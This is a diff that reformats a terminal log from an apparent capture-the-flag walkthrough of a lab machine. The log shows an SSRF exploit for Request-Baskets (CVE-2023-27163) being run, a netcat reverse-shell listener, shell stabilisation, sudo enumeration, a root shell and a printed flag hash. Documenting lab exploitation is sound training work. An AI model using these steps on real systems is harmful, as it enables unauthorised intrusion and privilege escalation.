@@ -1,9 +1,12 @@
-1. ──(sabeshan㉿kali)-[~/CVE/request_baskets_1.2.1]
+1.
+──(sabeshan㉿kali)-[~/CVE/request_baskets_1.2.1]
 └─$ python3 CVE-2023-27163.py 
 Exploit for SSRF vulnerability on Request-Baskets (1.2.1) (CVE-2023-27163).
 Usage: python3 exploit.py <public_url> <targeted_url>
 ----------------------------------------------------------------------------
-2.┌──(sabeshan㉿kali)-[~/CVE/request_baskets_1.2.1]
+2.
+```bash
+┌──(sabeshan㉿kali)-[~/CVE/request_baskets_1.2.1]
 └─$ python3 exploit.py 10.10.14.2 1337 http://10.10.11.224:55555/3e1fnu1
 Running exploit on http://10.10.11.224:55555/3e1fnu1/login
 ┌──(sabeshan㉿kali)-[~]
@@ -22,8 +25,10 @@ zsh: suspended  nc -lvnp 1337
 ┌──(sabeshan㉿kali)-[~]
 └─$ stty raw -echo; fg        
 [1]  + continued  nc -lvnp 1337
-puma@sau:/opt/maltrail$ 
+puma@sau:/opt/maltrail$
+```
 -------------------------------------------------------------------------------------
+```bash
 puma@sau:~$ sudo -l
 Matching Defaults entries for puma on sau:
     env_reset, mail_badpass,
@@ -67,5 +72,6 @@ root@sau:/home/puma# cat user.xtx \
 cat: 'user.xt'$'\n': No such file or directory
 root@sau:/home/puma# cat user.txt
 2a125d096683c2b4cde03c3122e00bf7
-root@sau:/home/puma# 
+root@sau:/home/puma#
+```
 -------------------------------------------------------------------------------------
